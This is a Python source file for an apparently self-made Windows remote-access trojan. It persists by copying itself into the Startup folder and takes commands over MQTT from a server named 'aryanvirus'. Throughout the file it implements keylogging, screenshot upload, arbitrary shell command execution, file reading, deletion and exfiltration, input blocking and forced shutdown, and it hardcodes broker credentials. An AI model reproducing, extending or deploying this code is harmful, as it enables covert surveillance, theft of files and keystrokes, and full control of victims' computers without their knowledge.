import paho.mqtt.client as mqtt
import threading
import time
import pyautogui as pg
import json
import keyboard
import random
import os
import subprocess
import webbrowser
import requests
import shutil
from pathlib import Path
import sys
import traceback
import winsound
import blockInput
from notepadType import notepad_write,start_random_move,stop_random_move
from klogging import start_logging,stop_logging
from filecontrol import list_folder,read_file,delete_file,create_file,send_file_to_server
from systemcontrol import display_off,display_on,full_volume,mute_volume ,set_wallpaper_from_url,run_psutil_from_string,get_open_and_active_windows

def resource_path(relative_path):

    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)


pg.FAILSAFE = False
# Startup setup
FLAG_FILE = Path(os.getenv('APPDATA')) / "firstrun.flag"
N_FLAG_FILE = Path(os.getenv('APPDATA')) / "notification.flag"
ID_FILE = Path(os.getenv('APPDATA')) / "id.txt"
BROKER_FILE = Path(os.getenv('APPDATA')) / "broker.txt"

FLAG_URL = "https://aryanvirus.onrender.com/mqtt_flag"
LOCAL_FLAG_FILE = Path(os.getenv('APPDATA')) / "mqtt_flag.json"
mqtt_enabled = False


def add_to_startup():
    try:
        startup_dir = Path(os.getenv('APPDATA')) / r"Microsoft\Windows\Start Menu\Programs\Startup"
        exe_path = Path(sys.argv[0]).resolve()
        destination = startup_dir / exe_path.name
        if not destination.exists():
            shutil.copy(exe_path, destination)
    except Exception as e:
        print(f"Failed to add to startup: {e}")


def set_flag_on_server(state: bool):
    if ID_FILE.exists():
        with open(ID_FILE) as f:
            pcid = f.read().strip()
    else:return     
    """Optional: set this PC's flag remotely (if needed)"""
    try:
        requests.get(f"{FLAG_URL}?pc_id={pcid}&state={'true' if state else 'false'}", timeout=10)
        print(f"[FLAG] Server flag for {pcid} set to {state}")
    except Exception as e:
        print(f"[FLAG] Error setting flag: {e}")        

if not FLAG_FILE.exists():
    add_to_startup()
    FLAG_FILE.touch()
    set_flag_on_server(True)

nFlag = False    
if N_FLAG_FILE.exists():
    nFlag = True    

serverUrl = "https://aryanvirus.onrender.com"
BROKER = "n171f1d9.ala.eu-central-1.emqxsl.com"
PORT = 8883
USERNAME = "aryanvish2006"
PASSWORD = "aryanvishvishalyadav"


if ID_FILE.exists():
    with open(ID_FILE) as f:
        pc_id = f.read().strip()
else:
    pc_id = str(random.randint(10000,99999))
    with open(ID_FILE,"w") as f:
        f.write(pc_id)  

if BROKER_FILE.exists():
    with open(BROKER_FILE) as f:
        BROKER = f.read().strip()
else:
    with open(BROKER_FILE,"w") as f:
        f.write(BROKER)               



# MQTT topics
CONTROL_TOPIC = f"control/{pc_id}"
ACK_TOPIC = f"ack/{pc_id}"
BROADCAST_TOPIC = "control/broadcast"
# Screenshot
def take_screenshot():
    try:
        filename = f"{pc_id}_screenshot.jpg"
        screenshotVar = pg.screenshot()
        screenshotVar.save(filename,"JPEG",quality=50)
        with open(filename, "rb") as f:
            requests.post(f"{serverUrl}/upload", files={"screenshot": f}, timeout=30)
            client.publish(ACK_TOPIC,f"Screenshot Captured Of Pc : {pc_id}")
        os.remove(filename)
    except Exception as e:
        client.publish(ACK_TOPIC,f"[screenshot error : {pc_id}] {e}")


def deleteScript():

    startup_path = Path(os.getenv('APPDATA')) / r"Microsoft\Windows\Start Menu\Programs\Startup"
    file_to_delete = os.path.join(startup_path, "client.exe") 
    if os.path.exists(file_to_delete):
        os.remove(file_to_delete)
    if os.path.exists(FLAG_FILE):
        os.remove(FLAG_FILE)
    if os.path.exists(N_FLAG_FILE):
        os.remove(N_FLAG_FILE)
        client.publish(ACK_TOPIC,f"DELETED NOTIFICATION.FLAG :{pc_id}")   
    if os.path.exists(ID_FILE):
        os.remove(ID_FILE)  
    if os.path.exists(BROKER_FILE):
        os.remove(BROKER_FILE)  
    client.publish(ACK_TOPIC,f"DELETED EVERYTHING FROM PC :{pc_id}")          

def deleteFlag():
    if os.path.exists(N_FLAG_FILE):
        os.remove(N_FLAG_FILE)
        client.publish(ACK_TOPIC,f"DELETED NOTIFICATION.FLAG :{pc_id}")   
def saveFlag():
    if not N_FLAG_FILE.exists():
        N_FLAG_FILE.touch()                            

def safe_thread(target, *args, **kwargs):
    def wrapper():
        try:
            target(*args, **kwargs)
        except Exception as e:
            print(f"[ERROR] {target.__name__}: {e}")
            client.publish(ACK_TOPIC,f"[ERROR : {pc_id}] {target.__name__}: {e}")
            traceback.print_exc()

    t = threading.Thread(target=wrapper, daemon=True)
    t.start()

def alertPrompt(text):
    pg.alert(text)

def inputPrompt(text):
    value = pg.prompt(text, " : ")
    return "Received = " + str(value)     

# Handle all messages
def handle_msg(msg):
    try:
        msg = msg.strip().lower()

        if msg == "block":
            safe_thread(blockInput.start_block, "both")
        elif msg == "blockkeyboard":
            safe_thread(blockInput.start_block, "keyboard")
        elif msg == "blockmouse":
            safe_thread(blockInput.start_block, "mouse")
        elif msg == "unblock":
            safe_thread(blockInput.unblock_all)
        elif msg == "shutdown":
            safe_thread(os.system, "shutdown /s /t 0")
        elif msg == "desktop":
            safe_thread(pg.hotkey, "win", "d")
        elif msg == "close":
            safe_thread(keyboard.send, "alt+f4")
        elif msg == "screenshot":
            safe_thread(take_screenshot)
        elif msg == "lock":
            safe_thread(os.system, "rundll32.exe user32.dll,LockWorkStation")
        elif msg == "cut":
            safe_thread(pg.press, "backspace")
        elif msg == "mouseright":
            pg.rightClick()  
        elif msg == "mouseleft":
            pg.leftClick()    
        elif msg == "click":
            pg.click()   
        elif msg == "doubleclick":
            pg.doubleClick()
        elif msg == "getscreensize":
            client.publish(ACK_TOPIC,f"SCREEN SIZE OF : {pc_id} :--> {pg.size()}")    
        elif msg == "displayoff":
            display_off()
        elif msg == "displayon":
            display_on() 
        elif msg == "fullvolume":
            full_volume()
        elif msg == "mutevolume":
            mute_volume()         
        elif msg =="startrandommove":
            start_random_move()
        elif msg == "stoprandommove":
            stop_random_move()  
        elif msg == "startkeylog":
            start_logging()
            client.publish(ACK_TOPIC,"Started Logging")
        elif msg == "stopkeylog":
            data = stop_logging()
            client.publish(ACK_TOPIC,f"Logged data of : [{pc_id}] : {data}")   
        elif msg == "getworkspace":
            data = get_open_and_active_windows()  
            client.publish(ACK_TOPIC, f"GETWORKSPACE [{pc_id}]:---> {data}")
        elif msg == "restart":
            os.execv(sys.executable,[sys.executable]+sys.argv)     
        elif msg == "end":
            os._exit(0)
        elif msg == "deletescript":
            deleteScript()    
        elif msg == "saveflag":
            saveFlag()
        elif msg == "deleteflag":
            deleteFlag()        
        elif msg == "setflagonserverfalse":
            set_flag_on_server(False)
        elif msg == "setflagonservertrue":
            set_flag_on_server(True)      
        elif msg.startswith("browser"):
            url = msg[len("browser "):]
            safe_thread(webbrowser.open, url)

        elif msg.startswith("type"):
            text = msg[len("type "):]
            safe_thread(pg.typewrite, text, 0.2)

        elif msg.startswith("notepadtype"):
            text = msg[len("notepadtype "):]
            safe_thread(notepad_write, text)

        elif msg.startswith("press"):
            key = msg[len("press "):]
            safe_thread(pg.press, key)
        elif msg.startswith("changeid"):
            idkey = msg[len("changeid "):]
            with open(ID_FILE,"w") as f:
                f.write(idkey)
            requests.get(f"{FLAG_URL}/delete?pc_id={pc_id}", timeout=15)   
            set_flag_on_server(True)   
            client.publish(ACK_TOPIC, f"Changed Id To :{idkey}")     

        elif msg.startswith("changebroker"):
            brokerkey = msg[len("changebroker "):]
            with open(BROKER_FILE,"w") as f:
                f.write(brokerkey)
            client.publish(ACK_TOPIC, f"Changed Broker To :{brokerkey}")         

        elif msg.startswith("alertprompt"):
            text = msg[len("alertprompt "):]
            safe_thread(alertPrompt, text)

        elif msg.startswith("inputprompt"):
            text = msg[len("inputprompt "):]
            def handle_input():
                value = inputPrompt(text)
                client.publish(ACK_TOPIC,f"{pc_id} : {value}")
            safe_thread(handle_input)
        elif msg.startswith("playtone"):
            parts = msg[len("playtone "):].split()
            if len(parts) == 2:
                safe_thread(winsound.Beep, int(parts[0]), int(parts[1]))    
        elif msg.startswith("keydown"):
            text = msg[len("keydown "):]
            def keydownfunc():
                pg.keyDown(text)
            safe_thread(keydownfunc) 
        elif msg.startswith("keyup"):
            text = msg[len("keyup "):]
            def keyupfunc():
                pg.keyUp(text)
            safe_thread(keyupfunc) 
        elif msg.startswith("backspace"):
            count = int(msg[len("backspace "):])
            def backspacer():
                for _ in range(count):
                    pg.press("backspace")
                    time.sleep(0.05)
            safe_thread(backspacer)

        elif msg.startswith("blockkey"):
            key = msg[len("blockkey "):]
            safe_thread(keyboard.block_key, key)

        elif msg.startswith("unblockkey"):
            key = msg[len("unblockkey "):]
            safe_thread(keyboard.unblock_key, key)

        elif msg.startswith("urlwallpaper"):
            link = msg[len("urlwallpaper "):]
            def setw():
                res=set_wallpaper_from_url(link)
                client.publish(ACK_TOPIC, f"Set Wallpaper [{pc_id}]: {res}")
            safe_thread(setw)        

        elif msg.startswith("remap"):
            parts = msg[len("remap "):].split()
            if len(parts) == 2:
                safe_thread(keyboard.remap_key, parts[0], parts[1])

        elif msg.startswith("swapkey"):
            parts = msg[len("swapkey "):].split()
            if len(parts) == 2:
                def swap():
                    keyboard.remap_key(parts[0], parts[1])
                    keyboard.remap_key(parts[1], parts[0])
                safe_thread(swap)
        elif msg.startswith("listfolder"):
            cmd_data = msg[len("listfolder "):]

            def list_cmd():
                try:
                    dataread = list_folder(cmd_data.strip())
                    client.publish(ACK_TOPIC, f"List Folder [{pc_id}]:--> {dataread}")
                except Exception as e:
                    client.publish(ACK_TOPIC, f"Error listing folder [{pc_id}]: {e}")

            safe_thread(list_cmd)

        elif msg.startswith("readfile"):
            cmd_data = msg[len("readfile "):]
            parts = cmd_data.split('|')
            if len(parts) != 2:
                client.publish(ACK_TOPIC, "Error: readfile requires 2 parameters separated by |")
            else:
                folder, filename = parts
        
                def read():
                    try:
                        dataread = read_file(folder.strip(), filename.strip())
                        client.publish(ACK_TOPIC, f"File Read [{pc_id}]:---> {dataread}")
                    except Exception as e:
                        client.publish(ACK_TOPIC, f"Error reading file [{pc_id}]: {e}")
        
                safe_thread(read)
        elif msg.startswith("twohotkey"):
            cmd_data = msg[len("twohotkey "):]
            parts = cmd_data.split('|')
            if len(parts) != 2:
                client.publish(ACK_TOPIC, "Error: hotkey requires 2 parameters separated by |")
            else:
                one, two = parts
                pg.hotkey(one,two) 
        elif msg.startswith("threehotkey"):
            cmd_data = msg[len("threehotkey "):]
            parts = cmd_data.split('|')
            if len(parts) != 3:
                client.publish(ACK_TOPIC, "Error: Hotkey requires 3 parameters separated by |")
            else:
                one,two,three = parts
                pg.hotkey(one,two,three)
                            
        elif msg.startswith("sendtoserver"):
            cmd_data = msg[len("sendtoserver "):]
            parts = cmd_data.split('|')
            if len(parts) != 2:
                client.publish(ACK_TOPIC, "Error: readfile requires 2 parameters separated by |")
            else:
                folder, filename = parts
        
                def sendserver():
                    try:
                        datasend =send_file_to_server(folder.strip(), filename.strip(),server_url=f"{serverUrl}/upload_new")
                        client.publish(ACK_TOPIC, f"File Send [{pc_id}] :---> {datasend}")
                    except Exception as e:
                        client.publish(ACK_TOPIC, f"Error Sending file [{pc_id}]: {e}")
        
                safe_thread(sendserver)        
        
        elif msg.startswith("deletefile"):
            cmd_data = msg[len("deletefile "):]
            parts = cmd_data.split('|')
            if len(parts) != 2:
                client.publish(ACK_TOPIC, "Error: deletefile requires 2 parameters separated by |")
            else:
                folder, filename = parts
        
                def delete():
                    try:
                        dataread = delete_file(folder.strip(), filename.strip())
                        client.publish(ACK_TOPIC, f"File Delete [{pc_id}]:---> {dataread}")
                    except Exception as e:
                        client.publish(ACK_TOPIC, f"Error deleting file [{pc_id}]: {e}")
        
                safe_thread(delete)
        
        elif msg.startswith("createfile"):
            cmd_data = msg[len("createfile "):]
            parts = cmd_data.split('|')
            if len(parts) != 3:
                client.publish(ACK_TOPIC, "Error: createfile requires 3 parameters separated by |")
            else:
                folder, filename, content = parts
        
                def create():
                    try:
                        dataread = create_file(folder.strip(), filename.strip(), content.strip())
                        client.publish(ACK_TOPIC, f"File Created [{pc_id}]:---> {dataread}")
                    except Exception as e:
                        client.publish(ACK_TOPIC, f"Error creating file [{pc_id}]: {e}")
        
                safe_thread(create)
               
        elif msg.startswith("moveto"):
            parts = msg[len("moveto "):].split()
            if len(parts) == 2:
                def move():
                    pg.moveTo(int(parts[0]),int(parts[1]),0.2)
                safe_thread(move)         

        elif msg.startswith("changedir"):
            new_dir = msg[len("changedir "):].strip()

            def change_dir():
                global CURRENT_WORKDIR
                try:
                    new_dir_abs = os.path.abspath(os.path.expanduser(new_dir))
                    if os.path.isdir(new_dir_abs):
                        CURRENT_WORKDIR = new_dir_abs
                        client.publish(ACK_TOPIC, f"Working directory changed to: {CURRENT_WORKDIR}")
                    else:
                        client.publish(ACK_TOPIC, f"Error: Directory does not exist: {new_dir_abs}")
                except Exception as e:
                    client.publish(ACK_TOPIC, f"Error changing directory: {e}")

            safe_thread(change_dir)
             

        elif msg.startswith("cmdwithoutput"):
            cmd = msg[len("cmdwithoutput "):]
            def cmd_exec():
                try:
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    client.publish(ACK_TOPIC,f"SUBPROCESS_[{pc_id}] :--Success--> {result.stdout}")
                except Exception as e:
                    client.publish(ACK_TOPIC, f"Error Subprocess [{pc_id}]: {e}")
            safe_thread(cmd_exec)
        elif msg.startswith("psutil"):
            cmd2 = msg[len("psutil "):]
            def psu_exec():
                try:
                    result2 = run_psutil_from_string(cmd2)
                    client.publish(ACK_TOPIC,f"PSUTIL_[{pc_id}] :--Success--> {result2}")
                except Exception as e:
                    client.publish(ACK_TOPIC, f"Error Psutil [{pc_id}]: {e}")
            safe_thread(psu_exec)    

    except Exception as e:
        print(f"[FATAL ERROR in handle_msg]: {e}")
        traceback.print_exc()

def send_data():
    try:
        client.publish(ACK_TOPIC, f"TRACE : [{pc_id}]")
        requests.get(f"{serverUrl}/posttrace", params={"pc_id": pc_id})
        print("sent")
    except:
        pass

def send_handler():
    threading.Thread(target=send_data).start()

keyboard.add_hotkey("ctrl+shift+q", send_handler)

heartbeat_started = False 

def on_connect(client, userdata, flags, rc):
    global heartbeat_started
    print(f"[{pc_id}] Connected to MQTT broker, code: {rc}")
    if rc == 0:
        client.subscribe(CONTROL_TOPIC, qos=2)
        client.subscribe(BROADCAST_TOPIC, qos=2)
        client.publish(ACK_TOPIC, f"[{pc_id}] Connected")

        if not heartbeat_started:
            heartbeat_started = True
            threading.Thread(target=heartbeat_loop, daemon=True).start()



def on_message(client, userdata, message):
    msg = message.payload.decode()
    print(f"Received: {msg}")
    client.publish(ACK_TOPIC, f"ACK:[{pc_id}] : RECIEVED [ {msg} ]")
    handle_msg(msg)


client = mqtt.Client(client_id=pc_id,clean_session=False)
client.username_pw_set(USERNAME, PASSWORD)
client.tls_set()  
client.tls_insecure_set(False)  
client.on_connect = on_connect
client.on_message = on_message
client.reconnect_delay_set(min_delay=1,max_delay=60)


delay = 5
while True:
    try:
        client.connect(BROKER, PORT, 300)
        print("MQTT connected successfully.")
        if nFlag:
            requests.get(f"https://aryanvirus.onrender.com/notify?msg={pc_id} : Connected")
        break
    except Exception as e:
        # print(f"MQTT connection failed: {e}, retrying in {delay}...")
        time.sleep(delay)
        delay=min(delay*2,60)


HEARTBEAT_INTERVAL = 20
HEARTBEAT_TOPIC = f"heartbeat/{pc_id}"
def heartbeat_loop():
    while True:
        try:
            if client.is_connected():
                client.publish(HEARTBEAT_TOPIC, "1")
        except Exception as e:pass
            # print(f"Heartbeat error: {e}")
        time.sleep(HEARTBEAT_INTERVAL)

def get_flag_from_server():
    try:
        url = f"{FLAG_URL}?pc_id={pc_id}"
        resp = requests.get(url, timeout=5)
        if resp.status_code != 200:
            print(f"[FLAG] bad status {resp.status_code}")
            return None

        data = resp.json()

        if "state" in data and isinstance(data["state"], bool):
            return data["state"]
        if "flag" in data and isinstance(data["flag"], bool):
            return data["flag"]

        print(f"[FLAG] invalid response format: {data}")
        return None
    except Exception as e:
        print(f"[FLAG] error fetching flag: {e}")
        return None

def load_local_flag():
    """Read local flag fallback."""
    if LOCAL_FLAG_FILE.exists():
        try:
            with open(LOCAL_FLAG_FILE, "r") as f:
                data = json.load(f)
                return data.get("flag", True)
        except Exception as e:
            print(f"[FLAG] Local flag read error: {e}")
    return True

def save_local_flag(value: bool):
    """Persist local flag for offline mode."""
    try:
        with open(LOCAL_FLAG_FILE, "w") as f:
            json.dump({"flag": value}, f)
    except Exception as e:
        print(f"[FLAG] Local flag save error: {e}")

if not LOCAL_FLAG_FILE.exists():
    save_local_flag(True)



flag = get_flag_from_server()

if flag is None:
    print("No internet — checking local flag.")
    flag = load_local_flag()
    if flag is None:
        flag = True  # default ON if no info

if not flag:
    print("Flag disabled by server — stopping script.")
    save_local_flag(False)
    os._exit(0)  # 🛑 stop script completely

# Otherwise, connect
save_local_flag(True)

client.loop_forever()




